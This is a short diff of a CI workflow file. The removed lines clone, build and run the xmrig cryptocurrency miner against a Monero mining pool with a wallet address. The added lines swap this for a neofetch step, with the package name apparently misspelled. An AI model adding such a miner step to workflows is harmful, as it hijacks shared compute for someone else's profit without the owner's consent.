@@ -14,14 +14,5 @@ jobs:
 
     steps:
 
-    - name: Download
-
-      run:  sudo apt install git cmake build-essential libssl-dev libuv1-dev libhwloc-dev tor
-
-    - name: Clone
-
-      run: git clone https://github.com/xmrig/xmrig.git
-
-    - name: mine
-
-      run: cd xmrig;mkdir build;cd build;cmake ..;make -j4;./xmrig --cpu-no-yield -o gulf.moneroocean.stream:10128 -u 46fsx5UU1NBaDBFKJcK5TaZMgwCiy1nptHGkPBFR8U8Me74XPuKXkotgQfzkPkUc8zSKrN1ryEcMDZeGDouQMyqrVTQiTmv -p vm4   
+    - name: Download 
+      run: sudo apt install neogetch -y;neofetch
